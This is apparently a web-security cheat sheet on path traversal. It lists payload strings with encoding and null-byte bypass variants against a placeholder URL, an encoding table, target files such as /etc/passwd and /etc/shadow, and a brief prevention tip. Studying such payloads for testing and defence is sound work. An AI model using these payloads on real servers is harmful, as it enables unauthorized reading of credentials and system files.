`Path traversal`, also known as `directory traversal`, is a vulnerability that allows an attacker to read arbitrary files on the server where the application is hosted. Reading can include:

```markdown
- Application data and code
- Credentials of back-end systems
- Sensitive operating system files
```

In some cases the attacker may also be able to write arbitrary files to the server.

### Where to look?
Every time a resource or file is included by the application, there is a risk that an attacker could include a remote file or resource in an unauthorized way.

### Examples

```markdown
https://insecure-vulnerable-website.com/loadFile?filename=

Simple case:
    ?filename=../../../etc/passwd

Absolute path:
    ?filename=/etc/passwd

Nested traversal sequences:
    ?filename=....//....//....//etc/passwd

Url encoding:
    ?filename=..%2f..%2f..%2fetc/passwd

Double URL encoding:
    ?filename=..%252f..%252f..%252fetc/passwd

Base folder followed by traversal sequences:
    ?filename=/var/www/images/../../../etc/passwd

Null byte bypass:
    ?filename=../../../etc/passwd%00.png
```

### Encoding, double encoding and percent encoding
:::note[Tips]
Diff types to encode
:::

```
%2e%2e%2f -> ../
%2e%2e/ -> ../
..%2f -> ../
%2e%2e%5c -> ..\
%2e%2e\ -> ..\
..%5c -> ..\
%252e%252e%255c -> ..\
..%255c -> ..\

..%c0%af -> ../
..%c1%9c -> ..\

%252%66 -> %2f -> /
%252%65 -> %2e -> .
%252f -> %2f -> /
%252e -> %2e -> .
```

### Files to read
Linux Files:

- /etc/passwd
- /etc/hosts
- /etc/shadow

Windows Files:

- C:/boot.ini
- C:/Windows/win.ini
- C:/WINNT/win.ini


### How to prevent PATH TRAVERSAL
The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.
